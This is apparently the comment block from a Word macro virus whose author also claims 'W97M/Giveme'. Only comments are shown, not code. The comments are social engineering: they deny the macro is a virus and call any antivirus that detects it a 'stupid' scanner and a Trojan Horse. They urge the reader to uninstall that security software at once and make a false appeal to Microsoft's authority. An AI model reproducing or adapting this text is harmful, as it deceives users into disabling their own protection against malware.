'Thank you for using my new cool Macro! It was created by the same
'author as the W97M/Giveme Macro. But this is much better, so if you
'liked my previous Macro, I'm sure you gonna like this one too!

'Some stupid anti-virus scanners may detect this Macro as a virus!
'But this is NOT a virus! It's just a Macro that modifies documents
'to make them better! If you have a stupid AV scanner that detects
'this useful Macro, then your scanner is a Trojan Horse that tries
'to remove useful code! You should immediately uninstall and stop
'using it. Microsoft don't like people who create trojan horses that
'destroys useful code!
